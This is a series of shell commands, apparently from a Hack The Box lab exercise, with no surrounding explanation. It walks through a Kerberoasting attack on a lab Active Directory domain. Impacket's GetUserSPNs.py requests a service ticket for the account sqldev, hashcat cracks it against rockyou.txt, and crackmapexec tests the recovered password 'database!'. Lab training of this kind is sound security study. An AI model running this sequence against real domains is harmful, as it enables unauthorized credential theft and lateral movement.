...
```shell-session
swmpdnky@htb[/htb]$ sudo python3 -m pip install .
...
```shell-session
swmpdnky@htb[/htb]$ GetUserSPNs.py -h
...
```shell-session
swmpdnky@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
...
```shell-session
swmpdnky@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
...
```shell-session
swmpdnky@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
...
```shell-session
swmpdnky@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
...
```shell-session
swmpdnky@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
...
```shell-session
swmpdnky@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
